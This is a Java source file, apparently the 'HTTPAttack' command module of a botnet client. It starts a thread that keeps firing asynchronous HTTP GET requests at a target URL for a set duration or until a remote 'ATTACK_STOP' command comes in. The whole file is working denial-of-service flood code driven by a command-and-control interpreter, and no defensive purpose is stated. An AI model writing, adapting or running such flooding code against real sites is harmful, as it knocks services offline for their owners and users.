package net.vitox.client.commands;

import net.vitox.client.InterpreteCMD;
import okhttp3.OkHttpClient;
import org.asynchttpclient.*;


public class HTTPAttack {

    public static OkHttpClient client = new OkHttpClient();
    public static Request request;

    private static AsyncHttpClient HTTP_CLIENT;

    public static void startAttack(String[] args) {

        AsyncHttpClientConfig clientConfig = Dsl.config().setConnectTimeout(15000).setRequestTimeout(15000).build();
        HTTP_CLIENT = Dsl.asyncHttpClient(clientConfig);

        long startTime = System.currentTimeMillis();

            new Thread(() -> {
                while (!InterpreteCMD.getCommand.equals("ATTACK_STOP")) {
                    requestURL(args[2]);
                    if (System.currentTimeMillis() - startTime > Long.parseLong(args[1])) {
                        break;
                    }
                }
            }).start();
        System.gc();
        Runtime.getRuntime().freeMemory();
    }

    public static void requestURL(String url) {
        request = Dsl.get(url).build();
        HTTP_CLIENT.executeRequest(request, new AsyncCompletionHandler<Integer>() {
            @Override
            public Integer onCompleted(Response response) {
                int resposeStatusCode = response.getStatusCode();
                System.out.println(resposeStatusCode);
                return resposeStatusCode;
            }
        });

//        try {
//            HTTP_CLIENT.close();
//        }catch (Exception e) {
//        }

//        try {
//            request = new Request.Builder().url(url).method("GET", null).addHeader("Content-Type", "application/json").build();
//            Response response = client.newCall(request).execute();
//            response.body().close();
//        } catch (Exception e) {
//             e.printStackTrace();
//        }
    }

}
